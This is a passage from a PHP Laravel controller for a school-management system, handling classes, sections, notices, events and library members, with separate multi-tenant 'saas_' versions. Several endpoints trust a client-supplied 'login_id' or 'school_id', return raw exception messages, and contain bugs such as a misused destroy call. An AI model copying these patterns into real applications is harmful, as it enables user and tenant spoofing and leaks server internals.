                        Schema::table($tableName, function ($table) {
                            $table->integer('active_status')->default(1)->nullable();
                        });
                    }

                    Toastr::error('Ops! Something went wrong. You are not allowed to remove this class', 'Failed');
                    return redirect()->back();
                }
            } //end foreach

            try {
                $delete_query = AramiscClassSection::where('class_id', $request->id)->update(['active_status' => 0]);
                $delete_query = AramiscClass::where('id', $request->id)->update(['active_status' => 0]);
                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                    if ($delete_query) {
                        return ApiBaseMethod::sendResponse(null, 'Class has been deleted successfully');
                    } else {
                        return ApiBaseMethod::sendError('Something went wrong, please try again.');
                    }
                } else {
                    if ($delete_query) {
                        Toastr::success('Operation successful', 'Success');
                        return redirect()->back();
                    } else {
                        Toastr::error('Operation Failed', 'Failed');
                        return redirect()->back();
                    }
                }
            } catch (\Illuminate\Database\QueryException $e) {
                $msg = 'This data already used in  : ' . $tables . ' Please remove those data first';
                Toastr::error('This item already used', 'Failed');
                return redirect()->back();
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_class_delete(Request $request,$school_id, $id)
    {

        try {
            $column_name = 'class_id';
            $t = FALSE;
            $tables = tableList::ONLY_TABLE_LIST($column_name);
            foreach ($tables as $table) {
                try {
                    DB::statement('SET FOREIGN_KEY_CHECKS=0;');
                    $d = DB::table($table)->where($column_name, '=', $id)->where('school_id',$school_id)->update(['active_status' => 0]);
                } catch (\Illuminate\Database\QueryException $e) {
                    $tableName = $table;
                    if (!Schema::hasColumn($tableName, 'active_status')) {
                        Schema::table($tableName, function ($table) {
                            $table->integer('active_status')->default(1)->nullable();
                        });
                    }

                    Toastr::error('Ops! Something went wrong. You are not allowed to remove this class', 'Failed');
                    return redirect()->back();
                }
            } //end foreach

            try {
                $delete_query = AramiscClassSection::where('class_id', $request->id)->where('school_id',$school_id)->update(['active_status' => 0]);
                $delete_query = AramiscClass::where('id', $request->id)->where('school_id',$school_id)->update(['active_status' => 0]);
                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                    if ($delete_query) {
                        return ApiBaseMethod::sendResponse(null, 'Class has been deleted successfully');
                    } else {
                        return ApiBaseMethod::sendError('Something went wrong, please try again.');
                    }
                } else {
                    if ($delete_query) {
                        Toastr::success('Operation successful', 'Success');
                        return redirect()->back();
                    } else {
                        Toastr::error('Operation Failed', 'Failed');
                        return redirect()->back();
                    }
                }
            } catch (\Illuminate\Database\QueryException $e) {
                $msg = 'This data already used in  : ' . $tables . ' Please remove those data first';
                Toastr::error('This item already used', 'Failed');
                return redirect()->back();
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function Section_index(Request $request)
    {

        try {
            $sections = AramiscSection::where('active_status', '=', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($sections, null);
            }
            return view('backEnd.academics.section', compact('sections'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_Section_index(Request $request, $school_id)
    {

        try {
            $sections = AramiscSection::where('active_status', '=', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('school_id',$school_id)->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($sections, null);
            }
            return view('backEnd.academics.section', compact('sections'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function Section_store(Request $request)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'name' => "required|max:200|unique:aramisc_sections,section_name"
        ]);
        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }
        try {
            $section = new AramiscSection();
            $section->section_name = $request->name;
            $section->created_at = YearCheck::getYear() . '-' . date('m-d h:i:s');
            $result = $section->save();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Section has been created successfully');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
                    Toastr::success('Operation successful', 'Success');

                    return redirect()->back();
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_Section_store(Request $request)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'name' => "required|max:200|unique:aramisc_sections,section_name",
            'school_id' => "required"
        ]);
        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }
        try {
            $section = new AramiscSection();
            $section->section_name = $request->name;
            $section->school_id = $request->school_id;
            $section->created_at = YearCheck::getYear() . '-' . date('m-d h:i:s');
            $result = $section->save();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Section has been created successfully');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
                    Toastr::success('Operation successful', 'Success');

                    return redirect()->back();
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function Section_edit(Request $request, $id)
    {

        try {
            $section = AramiscSection::find($id);
            $sections = AramiscSection::where('active_status', '=', 1)->orderBy('id', 'desc')->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['section'] = $section->toArray();
                $data['sections'] = $sections->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }

            return view('backEnd.academics.section', compact('section', 'sections'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_Section_edit(Request $request,$school_id, $id)
    {

        try {
            $section = AramiscSection::where('school_id',$school_id)->find($id);
            $sections = AramiscSection::where('active_status', '=', 1)->orderBy('id', 'desc')->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('school_id',$school_id)->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['section'] = $section->toArray();
                $data['sections'] = $sections->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }

            return view('backEnd.academics.section', compact('section', 'sections'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function Section_update(Request $request)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'name' => "required|max:200|unique:aramisc_sections,section_name," . $request->id
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }

        try {
            $section = AramiscSection::find($request->id);
            $section->section_name = $request->name;
            $result = $section->save();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Section has been updated successfully');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
                    Toastr::success('Operation successful', 'Success');

                    return redirect('section');
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_Section_update(Request $request)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'name' => "required|max:200|unique:aramisc_sections,section_name," . $request->id,
            'school_id' => "required"
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }

        try {
            $section = AramiscSection::where('school_id',$request->school_id)->find($request->id);
            $section->section_name = $request->name;
            $section->school_id = $request->school_id;
            $result = $section->save();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Section has been updated successfully');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
                    Toastr::success('Operation successful', 'Success');

                    return redirect('section');
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function Section_delete(Request $request, $id)
    {


        try {
            $id = 'section_id';
            $tables = tableList::getTableList($id,$request->id);
            try {
                $delete_query = $section = AramiscSection::destroy($request->id);

                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                    if ($section) {
                        return ApiBaseMethod::sendResponse(null, 'Section has been deleted successfully');
                    } else {
                        return ApiBaseMethod::sendError('Something went wrong, please try again.');
                    }
                } else {
                    if ($delete_query) {
                        Toastr::success('Operation successful', 'Success');
                        return redirect('section');
                    } else {
                        Toastr::error('Operation Failed', 'Failed');
                        return redirect()->back();
                    }
                }
            } catch (\Illuminate\Database\QueryException $e) {

                $msg = 'This data already used in  : ' . $tables . ' Please remove those data first';
                Toastr::error('This item already used', 'Failed');
                return redirect()->back();
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_Section_delete(Request $request,$school_id, $id)
    {


        try {
            $id = 'section_id';
            $tables = tableList::getTableList($id,$request->id);
            try {
                $delete_query = $section = AramiscSection::where('school_id',$school_id)->destroy($request->id);

                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                    if ($section) {
                        return ApiBaseMethod::sendResponse(null, 'Section has been deleted successfully');
                    } else {
                        return ApiBaseMethod::sendError('Something went wrong, please try again.');
                    }
                } else {
                    if ($delete_query) {
                        Toastr::success('Operation successful', 'Success');
                        return redirect('section');
                    } else {
                        Toastr::error('Operation Failed', 'Failed');
                        return redirect()->back();
                    }
                }
            } catch (\Illuminate\Database\QueryException $e) {

                $msg = 'This data already used in  : ' . $tables . ' Please remove those data first';
                Toastr::error('This item already used', 'Failed');
                return redirect()->back();
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }



    public function noticeList(Request $request)
    {
        try {
            $allNotices = AramiscNoticeBoard::where('active_status', 1)
                ->orderBy('id', 'DESC')
                ->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())
                ->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($allNotices, null);
            }
            return view('backEnd.communicate.noticeList', compact('allNotices'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_noticeList(Request $request, $school_id)
    {
        try {
            $allNotices = AramiscNoticeBoard::withoutGlobalScope(StatusAcademicSchoolScope::class)->where('active_status', 1)
                ->orderBy('id', 'DESC')
                ->where('academic_id', AramiscAcademicYear::API_ACADEMIC_YEAR($school_id))
                ->where('school_id',$school_id)
                ->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($allNotices, null);
            }
            return view('backEnd.communicate.noticeList', compact('allNotices'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function sendMessage(Request $request)
    {

        try {
            $roles = AramiscRole::where('active_status', 1)->where(function ($q) {
                $q->where('school_id', Auth::user()->school_id)->orWhere('type', 'System');
            })->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($roles, null);
            }
            return view('backEnd.communicate.sendMessage', compact('roles'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_sendMessage(Request $request,$school_id)
    {

        try {
            $roles = AramiscRole::where('school_id',$school_id)->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($roles, null);
            }
            return view('backEnd.communicate.sendMessage', compact('roles'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saveNoticeData(Request $request)
    {
        $input = $request->all();
        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $validator = Validator::make($input, [
                'notice_title' => "required|max:50",
                'notice_date' => "required",
                'publish_on' => "required",
                'login_id' => "required"
            ]);
        } else {
            $validator = Validator::make($input, [
                'notice_title' => "required|max:50",
                'notice_date' => "required",
                'publish_on' => "required",
            ]);
        }

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }
        try {
            $roles_array = array();
            if (empty($request->role)) {
                $roles_array = '';
            } else {
                $roles_array = implode(',', $request->role);
            }

            $user = Auth()->user();

            if ($user) {
                $login_id = $user->id;
            } else {
                $login_id = $request->login_id;
            }

            $noticeData = new AramiscNoticeBoard();
            if (isset($request->is_published)) {
                $noticeData->is_published = $request->is_published;
            }
            $noticeData->notice_title = $request->notice_title;
            $noticeData->notice_message = $request->notice_message;
            $noticeData->notice_date = date('Y-m-d', strtotime($request->notice_date));
            $noticeData->publish_on = date('Y-m-d', strtotime($request->publish_on));
            $noticeData->inform_to = $roles_array;
            $noticeData->created_by = $login_id;
            $results = $noticeData->save();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($results) {
                    return ApiBaseMethod::sendResponse(null, 'Class Room has been created successfully');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($results) {
                    Toastr::success('Operation successful', 'Success');
                    return redirect('notice-list');
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_saveNoticeData(Request $request)
    {
        $input = $request->all();
        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $validator = Validator::make($input, [
                'notice_title' => "required|max:50",
                'notice_date' => "required",
                'publish_on' => "required",
                'login_id' => "required",
                'school_id' => "required"
            ]);
        } else {
            $validator = Validator::make($input, [
                'notice_title' => "required|max:50",
                'notice_date' => "required",
                'publish_on' => "required",
                'school_id' => "required"
            ]);
        }

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }
        try {
            $roles_array = array();
            if (empty($request->role)) {
                $roles_array = '';
            } else {
                $roles_array = implode(',', $request->role);
            }

            $user = Auth()->user();

            if ($user) {
                $login_id = $user->id;
            } else {
                $login_id = $request->login_id;
            }

            $noticeData = new AramiscNoticeBoard();
            if (isset($request->is_published)) {
                $noticeData->is_published = $request->is_published;
            }
            $noticeData->notice_title = $request->notice_title;
            $noticeData->notice_message = $request->notice_message;
            $noticeData->notice_date = date('Y-m-d', strtotime($request->notice_date));
            $noticeData->publish_on = date('Y-m-d', strtotime($request->publish_on));
            $noticeData->inform_to = $roles_array;
            $noticeData->created_by = $login_id;
            $noticeData->school_id = $request->school_id;
            $results = $noticeData->save();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($results) {
                    return ApiBaseMethod::sendResponse(null, 'Class Room has been created successfully');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($results) {
                    Toastr::success('Operation successful', 'Success');
                    return redirect('notice-list');
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function editNotice(Request $request, $notice_id)
    {


        try {
            $roles = AramiscRole::where('active_status', 1)->where(function ($q) {
                $q->where('school_id', Auth::user()->school_id)->orWhere('type', 'System');
            })->get();
            $noticeDataDetails = AramiscNoticeBoard::find($notice_id);

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['roles'] = $roles->toArray();
                $data['noticeDataDetails'] = $noticeDataDetails->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.communicate.editSendMessage', compact('noticeDataDetails', 'roles'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_editNotice(Request $request,$school_id, $notice_id)
    {


        try {
            $roles = AramiscRole::where('active_status', 1)->where(function ($q) {
                $q->where('school_id', Auth::user()->school_id)->orWhere('type', 'System');
            })->get();
            $noticeDataDetails = AramiscNoticeBoard::where('school_id',$school_id)->find($notice_id);

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['roles'] = $roles->toArray();
                $data['noticeDataDetails'] = $noticeDataDetails->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.communicate.editSendMessage', compact('noticeDataDetails', 'roles'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function updateNoticeData(Request $request)
    {
        $input = $request->all();
        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $validator = Validator::make($input, [
                'notice_title' => "required|max:50",
                'notice_date' => "required",
                'publish_on' => "required",
                'login_id' => "required"
            ]);
        } else {
            $validator = Validator::make($input, [
                'notice_title' => "required|max:50",
                'notice_date' => "required",
                'publish_on' => "required",
            ]);
        }

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }
        try {
            $roles_array = array();
            if (empty($request->role)) {
                $roles_array = '';
            } else {
                $roles_array = implode(',', $request->role);
            }

            $user = Auth()->user();

            if ($user) {
                $login_id = $user->id;
            } else {
                $login_id = $request->login_id;
            }

            $noticeData = AramiscNoticeBoard::find($request->notice_id);
            if (isset($request->is_published)) {
                $noticeData->is_published = $request->is_published;
            }
            $noticeData->notice_title = $request->notice_title;
            $noticeData->notice_message = $request->notice_message;
            $noticeData->notice_date = date('Y-m-d', strtotime($request->notice_date));
            $noticeData->publish_on = date('Y-m-d', strtotime($request->publish_on));
            $noticeData->inform_to = $roles_array;
            $noticeData->updated_by = $login_id;
            $results = $noticeData->update();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($results) {
                    return ApiBaseMethod::sendResponse(null, 'Notice has been updated successfully');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again');
                }
            } else {
                if ($results) {
                    Toastr::success('Operation successful', 'Success');
                    return redirect('notice-list');
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_updateNoticeData(Request $request)
    {
        $input = $request->all();
        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $validator = Validator::make($input, [
                'notice_title' => "required|max:50",
                'notice_date' => "required",
                'publish_on' => "required",
                'login_id' => "required",
                'school_id' => "required"
            ]);
        } else {
            $validator = Validator::make($input, [
                'notice_title' => "required|max:50",
                'notice_date' => "required",
                'publish_on' => "required",
                'school_id' => "required"
            ]);
        }

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }
        try {
            $roles_array = array();
            if (empty($request->role)) {
                $roles_array = '';
            } else {
                $roles_array = implode(',', $request->role);
            }

            $user = Auth()->user();

            if ($user) {
                $login_id = $user->id;
            } else {
                $login_id = $request->login_id;
            }

            $noticeData = AramiscNoticeBoard::where('school_id',$request->school_id)->find($request->notice_id);
            if (isset($request->is_published)) {
                $noticeData->is_published = $request->is_published;
            }
            $noticeData->notice_title = $request->notice_title;
            $noticeData->notice_message = $request->notice_message;
            $noticeData->notice_date = date('Y-m-d', strtotime($request->notice_date));
            $noticeData->publish_on = date('Y-m-d', strtotime($request->publish_on));
            $noticeData->inform_to = $roles_array;
            $noticeData->updated_by = $login_id;
            $noticeData->school_id = $request->school_id;
            $results = $noticeData->update();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($results) {
                    return ApiBaseMethod::sendResponse(null, 'Notice has been updated successfully');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again');
                }
            } else {
                if ($results) {
                    Toastr::success('Operation successful', 'Success');
                    return redirect('notice-list');
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function deleteNoticeView(Request $request, $id)
    {

        try {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($id, null);
            }
            return view('backEnd.communicate.deleteNoticeView', compact('id'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_deleteNoticeView(Request $request,$school_id, $id)
    {

        try {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($id, null);
            }
            return view('backEnd.communicate.deleteNoticeView', compact('id'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function sendEmailSmsView(Request $request)
    {
        try {
            $roles = AramiscRole::select('*')->where('id', '!=', 1)->where(function ($q) {
                $q->where('school_id', Auth::user()->school_id)->orWhere('type', 'System');
            })->get();
            $classes = AramiscClass::where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['roles'] = $roles->toArray();
                $data['classes'] = $classes->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }

            return view('backEnd.communicate.sendEmailSms', compact('roles', 'classes'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_sendEmailSmsView(Request $request, $school_id)
    {
        try {
            $roles = AramiscRole::select('*')->where('id', '!=', 1)->where(function ($q) {
                $q->where('school_id', Auth::user()->school_id)->orWhere('type', 'System');
            })->get();
            $classes = AramiscClass::where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('school_id',$school_id)->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['roles'] = $roles->toArray();
                $data['classes'] = $classes->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }

            return view('backEnd.communicate.sendEmailSms', compact('roles', 'classes'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function deleteNotice(Request $request, $id)
    {
        try {
            $result = AramiscNoticeBoard::destroy($id);
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Notice has been deleted successfully');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
                    Toastr::success('Operation successful', 'Success');
                    return redirect()->back();
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_deleteNotice(Request $request,$school_id, $id)
    {
        try {
            $result = AramiscNoticeBoard::where('school_id',$school_id)->where('id',$id)->delete();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Notice has been deleted successfully');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
                    Toastr::success('Operation successful', 'Success');
                    return redirect()->back();
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function deleteEventView(Request $request, $id)
    {
        try {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {

                return ApiBaseMethod::sendResponse($id, null);
            }
            return view('backEnd.events.deleteEventView', compact('id'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_deleteEventView(Request $request,$school_id, $id)
    {
        try {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {

                return ApiBaseMethod::sendResponse($id, null);
            }
            return view('backEnd.events.deleteEventView', compact('id'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function deleteEvent(Request $request, $id)
    {

        try {
            $result = AramiscEvent::destroy($id);

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Event has been deleted successfully');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
                    Toastr::success('Operation successful', 'Success');
                    return redirect('event');
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_deleteEvent(Request $request, $school_id, $id)
    {

        try {
            $result = AramiscEvent::where('school_id',$school_id)->where('id',$id)->delete();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Event has been deleted successfully');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
                    Toastr::success('Operation successful', 'Success');
                    return redirect('event');
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function Library_index(Request $request)
    {

        try {
            $books = DB::table('aramisc_books')
                ->leftjoin('aramisc_subjects', 'aramisc_books.book_subject_id', '=', 'aramisc_subjects.id')
                ->leftjoin('aramisc_book_categories', 'aramisc_books.book_category_id', '=', 'aramisc_book_categories.id')
                ->select('aramisc_books.*', 'aramisc_subjects.subject_name', 'aramisc_book_categories.category_name')
                ->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {

                return ApiBaseMethod::sendResponse($books, null);
            }

            return view('backEnd.library.bookList', compact('books'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_Library_index(Request $request, $school_id)
    {

        try {
            $books = DB::table('aramisc_books')
                ->leftjoin('aramisc_subjects', 'aramisc_books.book_subject_id', '=', 'aramisc_subjects.id')
                ->leftjoin('aramisc_book_categories', 'aramisc_books.book_category_id', '=', 'aramisc_book_categories.id')
                ->where('aramisc_books.school_id',$school_id)
                ->select('aramisc_books.*', 'aramisc_subjects.subject_name', 'aramisc_book_categories.category_name')
                ->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {

                return ApiBaseMethod::sendResponse($books, null);
            }

            return view('backEnd.library.bookList', compact('books'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }

    public function memberList(Request $request)
    {

        try {
            $activeMembers = AramiscLibraryMember::where('active_status', '=', 1)->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {

                return ApiBaseMethod::sendResponse($activeMembers, null);
            }
            return view('backEnd.library.memberLists', compact('activeMembers'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_memberList(Request $request, $school_id)
    {

        try {
            $activeMembers = AramiscLibraryMember::where('active_status', '=', 1)->where('school_id',$school_id)->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {

                return ApiBaseMethod::sendResponse($activeMembers, null);
            }
            return view('backEnd.library.memberLists', compact('activeMembers'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function issueBooks(Request $request, $member_type, $student_staff_id)
    {

        try {
            $memberDetails = AramiscLibraryMember::where('student_staff_id', '=', $student_staff_id)->first();

            if ($member_type == 2) {
                $getMemberDetails = AramiscStudent::select('full_name', 'email', 'mobile', 'student_photo')->where('user_id', '=', $student_staff_id)->first();
            } else {
                $getMemberDetails = AramiscStaff::select('full_name', 'email', 'mobile', 'staff_photo')->where('user_id', '=', $student_staff_id)->first();
            }

            $books = AramiscBook::all();
            $totalIssuedBooks = AramiscBookIssue::where('member_id', '=', $student_staff_id)->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['memberDetails'] = $memberDetails->toArray();
                $data['books'] = $books->toArray();
                $data['totalIssuedBooks'] = $totalIssuedBooks->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.library.issueBooks', compact('memberDetails', 'books', 'getMemberDetails', 'totalIssuedBooks'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_issueBooks(Request $request,$school_id, $member_type, $student_staff_id)
    {
